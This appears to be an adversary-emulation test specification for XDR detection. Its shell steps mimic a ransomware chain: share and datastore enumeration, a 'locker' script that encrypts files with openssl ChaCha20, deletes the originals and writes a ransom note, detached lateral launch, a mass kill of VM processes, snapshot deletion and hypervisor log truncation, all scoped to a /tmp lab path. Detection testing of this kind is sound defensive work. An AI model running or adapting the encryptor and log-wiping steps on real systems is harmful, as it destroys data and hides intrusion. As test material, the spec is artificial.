steps.command:
LAB=/tmp/cortexsim-mp031
mkdir -p "$LAB/ProgramData" "$LAB/var/log"
for vm in vm-01 vm-02 vm-03; do
  d="$LAB/vmfs/volumes/datastore1/$vm"
  mkdir -p "$d"
  head -c 65536 /dev/urandom > "$d/$vm-flat.vmdk"
  printf 'displayName = "%s"\nguestOS = "other-64"\n' "$vm" > "$d/$vm.vmx"
  head -c 4096 /dev/urandom > "$d/$vm-Snapshot1.vmsn"
done
for n in hostd vmkernel vpxa; do head -c 2048 /dev/urandom | base64 > "$LAB/var/log/$n.log"; done
out="$LAB/ProgramData/found_shares.txt"
{ cat /proc/mounts; df -hP; find "$LAB/vmfs/volumes" -maxdepth 2 -type d; getent hosts "${STAGE_HOST:-127.0.0.1}"; } > "$out" 2>&1
wc -l "$out"

expected_detections.description: A shell enumerates mounts, filesystems and datastore directories and redirects the result into a file named found_shares.txt under a ProgramData-shaped path — the report's share-enumeration output file.

steps.name: Share and datastore enumeration written to ProgramData/found_shares.txt

steps.command:
LAB=/tmp/cortexsim-mp031
PUB="$LAB/Users/Public"
SHARE="$LAB/mnt/${STAGE_HOST:-127.0.0.1}/C\$"
mkdir -p "$PUB" "$SHARE/Users/Public" "$SHARE/data"
cat > "$PUB/locker" <<'LOCKER'
#!/bin/sh
# cortexsim-mp031 Cicada3301-shaped encryptor stand-in: ChaCha20 over files under /tmp/cortexsim-* only
KEY=""; P=""; SLEEP=0
while [ $# -gt 0 ]; do
  case "$1" in
    --key) KEY="$2"; shift 2 ;;
    -p|--path) P="$2"; shift 2 ;;
    -s|--sleep) SLEEP="$2"; shift 2 ;;
    *) shift ;;
  esac
done
case "$P" in /tmp/cortexsim-*) ;; *) echo "refusing path outside /tmp/cortexsim-*: $P" >&2; exit 3 ;; esac
[ -n "$KEY" ] || exit 4
sleep "$SLEEP"
find "$P" -type f ! -name '*.kcr5umw' ! -name 'RECOVER-*' | while read -r f; do
  openssl enc -chacha20 -pbkdf2 -pass "pass:$KEY" -in "$f" -out "$f.kcr5umw" 2>/dev/null \
    || openssl enc -aes-256-ctr -pbkdf2 -pass "pass:$KEY" -in "$f" -out "$f.kcr5umw"
  rm -f "$f"
done
printf 'cortexsim-mp031 lab ransom-note stand-in. Nothing was taken; files under %s were encrypted with a lab key.\n' "$P" > "$P/RECOVER-kcr5umw-DATA.txt"
LOCKER
printf '#!/bin/sh\n"%s/locker" --no_impl --key "${CICADA_LAB_KEY:-cortexsim-mp031-lab-key}" -p %s/vmfs/volumes\n' "$PUB" "$LAB" > "$PUB/1.sh"
chmod 0755 "$PUB/locker" "$PUB/1.sh"
cp "$PUB/locker" "$PUB/1.sh" "$SHARE/Users/Public/"
for i in 01 02 03 04 05; do head -c 8192 /dev/urandom > "$SHARE/data/finance-$i.xlsx"; done
setsid nohup "$SHARE/Users/Public/locker" --no_impl --key "${CICADA_LAB_KEY:-cortexsim-mp031-lab-key}" -s 1 -p "$SHARE/data" > /dev/null 2>&1 &
sleep 5
ls -l "$SHARE/data"

expected_detections.description: An executable is written into a Users/Public directory on a C$-shaped share path and launched detached (setsid/nohup) with the encryptor's --no_impl --key arguments — the report's embedded-PsExec '-s -d locker --no_impl --key' spread.
The detached locker process reads files on the share path, writes .kcr5umw copies and deletes the originals, then drops RECOVER-kcr5umw-DATA.txt — encryption on the lateral target.

steps.name: Lateral spread — locker and 1.sh copied onto the stage host's share path, run detached with --no_impl --key

steps.command:
LAB=/tmp/cortexsim-mp031
DS="$LAB/vmfs/volumes/datastore1"
for vmx in "$DS"/*/*.vmx; do
  bash -c 'exec -a "vmx-cortexsim-mp031 $1" sleep 600' _ "$vmx" &
done
sleep 2
pgrep -f '^vmx-cortexsim-mp031 ' | wc -l
pkill -KILL -f '^vmx-cortexsim-mp031 '
find "$DS" -type f -name '*.vmsn' -print -delete
for f in "$LAB"/var/log/*.log; do : > "$f"; done
ls -l "$LAB/var/log"

expected_detections.description: One shell kills every VM-worker-shaped (vmx) process in one pkill — the Linux/hypervisor rendering of the report's 'Get-VM | Stop-VM -Force' stop-all-VMs command before encryption.

The same chain deletes VM snapshot files (*.vmsn) under a vmfs/volumes path and truncates hostd/vmkernel/vpxa logs — the report's shadow-copy deletion and event-log clearing (T1070.001), transposed to Linux log truncation (T1070.002), scoped to the lab datastore.

steps.name: Pre-encryption — mass stop of vmx-named VM processes, snapshot deletion and hypervisor log wipe (lab datastore only)

CR-MP-0031 fuses found_shares.txt, the share-path locker run, the report-hash WildFire verdicts, the rclone staging and the upload to the report exfil IP, the VM-stop/wipe stage and the datastore encryption into one incident on src_host within the window.

success_criteria:
On one lab Linux host, the endpoint stages (found_shares.txt after mount/share enumeration,
a locker binary copied onto a share path and run detached with --no_impl --key, a renamed
rclone with rclone.conf in a ProgramData-shaped directory, the mass kill of vmx-named
processes with snapshot and log wipe, and the ChaCha20 .kcr5umw encryption with
RECOVER-kcr5umw-DATA.txt) raise their XDR BIOCs; the NGFW threat log carries three report
sha256s and the NGFW EAL upload carries the report exfil IP, both naming the same src_host.
CR-MP-0031 stitches EDR + NDR into one incident within the window. Detection only; no
prevention outcome is claimed.
